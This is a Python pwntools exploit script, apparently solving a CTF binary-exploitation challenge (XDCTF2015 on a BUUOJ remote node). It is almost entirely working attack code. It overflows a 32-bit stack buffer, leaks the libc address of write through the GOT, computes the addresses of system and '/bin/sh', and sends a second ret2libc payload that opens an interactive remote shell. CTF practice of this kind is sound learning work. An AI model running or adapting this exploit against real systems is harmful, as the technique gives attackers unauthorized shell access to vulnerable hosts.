from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',29358)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive






libc=ELF('./libc')
elf=ELF('./pwn')

wp=elf.plt['write']
wg=elf.got['write']





ru(b'elcome to XDCTF2015~!\n')
main=0x0804851C
payload1=b'a'*(0x6c+4)+p32(wp)+p32(main)+p32(1)+p32(wg)+p32(4)

sl(payload1)
#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
addr=u32(io.recvuntil(b'\xf7')[-4:])
#ru(b'0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#print(hex(rbp))



libc_base_addr=addr-libc.sym['write']
system_addr=libc_base_addr+ libc.sym['system']    
bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))





ru(b'elcome to XDCTF2015~!\n')


payload2=b'a'*(0x6c+4)+p32(system_addr)+p32(main)+p32(bin_sh_addr)    #+p32(wg)+p32(4)


sl(payload2)

ii()
